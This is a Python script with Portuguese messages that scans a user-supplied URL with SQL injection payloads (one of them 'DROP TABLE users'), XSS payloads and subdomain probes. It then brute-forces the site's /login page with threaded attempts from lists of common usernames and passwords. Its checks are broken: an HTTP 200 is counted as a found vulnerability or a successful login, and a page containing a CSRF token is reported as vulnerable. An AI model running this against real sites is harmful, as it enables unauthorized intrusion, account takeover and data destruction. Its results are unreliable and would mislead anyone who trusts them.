import requests
import threading
import os
from urllib.parse import urlparse

def print_colored(text, color_code):
    print(f"\033[{color_code}m{text}\033[0m")

def check_security_headers(url):
    print("\nVerificando cabeçalhos de segurança...")
    headers_to_check = [
        "Strict-Transport-Security",
        "X-Content-Type-Options",
        "X-Frame-Options",
        "Content-Security-Policy",
        "X-XSS-Protection"
    ]
    
    try:
        response = requests.get(url)
        headers = response.headers
        
        for header in headers_to_check:
            if header in headers:
                print(f"Cabeçalho de segurança encontrado: {header}")
            else:
                print(f"Cabeçalho de segurança ausente: {header}")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao verificar cabeçalhos: {e}")

def check_sql_injection(url):
    print("\nVerificando injeção SQL...")
    test_payloads = [
        "' OR '1'='1",
        "' OR 1=1 --",
        "' UNION SELECT NULL, NULL --",
        "'; DROP TABLE users; --"
    ]
    
    for payload in test_payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"Vulnerabilidade de SQL Injection encontrada com: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao testar injeção SQL: {e}")

def check_xss(url):
    print("\nVerificando XSS...")
    xss_payloads = [
        "<script>alert(1)</script>",
        '<img src="x" onerror="alert(1)">',
        "<svg onload=alert(1)>"
    ]
    
    for payload in xss_payloads:
        test_url = f"{url}{payload}"
        try:
            response = requests.get(test_url)
            if response.status_code == 200:
                print(f"Vulnerabilidade XSS encontrada com: {test_url}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao testar XSS: {e}")

def check_csrf(url):
    print("\nVerificando CSRF...")
    try:
        response = requests.get(url)
        if "csrf" in response.text.lower(): 
            print("Vulnerabilidade CSRF detectada!")
        else:
            print("Nenhuma vulnerabilidade CSRF detectada.")
    except requests.exceptions.RequestException as e:
        print(f"Erro ao verificar CSRF: {e}")

def check_subdomains(url):
    print("\nVerificando subdomínios...")
    base_url = urlparse(url).netloc
    subdomains = ['www', 'api', 'blog', 'dev', 'test', 'mail']

    def check_subdomain(subdomain):
        subdomain_url = f"http://{subdomain}.{base_url}" if not base_url.startswith(subdomain) else f"http://{base_url}"
        try:
            response = requests.get(subdomain_url)
            if response.status_code == 200:
                print(f"Subdomínio encontrado: {subdomain_url}")
        except requests.exceptions.RequestException as e:
            print(f"Subdomínio não encontrado: {subdomain_url} - Erro: {e}")

    threads = []
    for subdomain in subdomains:
        thread = threading.Thread(target=check_subdomain, args=(subdomain,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

def brute_force_login(url, usernames, passwords):
    print("\nIniciando brute force para login...")
    login_url = f"{url}/login"  # Altere conforme necessário

    def attempt_login(username, password):
        payload = {
            "username": username,
            "password": password
        }
        
        try:
            response = requests.post(login_url, data=payload)
            
            if "success" in response.text or response.status_code == 200: 
                print(f"Login bem-sucedido com: {username}:{password}")
            else:
                print(f"Tentativa falhou: {username}:{password}")
        except requests.exceptions.RequestException as e:
            print(f"Erro ao tentar login: {e}")
    
    threads = []
    for username in usernames:
        for password in passwords:
            thread = threading.Thread(target=attempt_login, args=(username, password))
            threads.append(thread)
            thread.start()

    for thread in threads:
        thread.join()

def advanced_scan(url):
    print(f"Iniciando verificação avançada de vulnerabilidades em: {url}")
    check_security_headers(url)
    check_sql_injection(url)
    check_xss(url)
    check_csrf(url)
    check_subdomains(url)

def start_brute_force(url):
    usernames = [
        "admin", "user", "root", "guest", "admin123", "test", "user1", "admin1", "superuser", 
        "manager", "staff", "support", "developer", "guest1", "operator"
    ]
    
    passwords = [
        "123456", "password", "admin", "12345", "qwerty", "abc123", "letmein", "123qwe", 
        "password1", "welcome", "1234", "qwerty123", "1q2w3e4r", "supersecret", "letmein123"
    ]
    
    brute_force_login(url, usernames, passwords)

if __name__ == "__main__":
    os.system('cls' if os.name == 'nt' else 'clear')
    print_colored("Created by @Wry", 31)
    url = input("\nDigite a URL do site a ser verificado (ex: http://example.com): ")
    advanced_scan(url)
    start_brute_force(url)
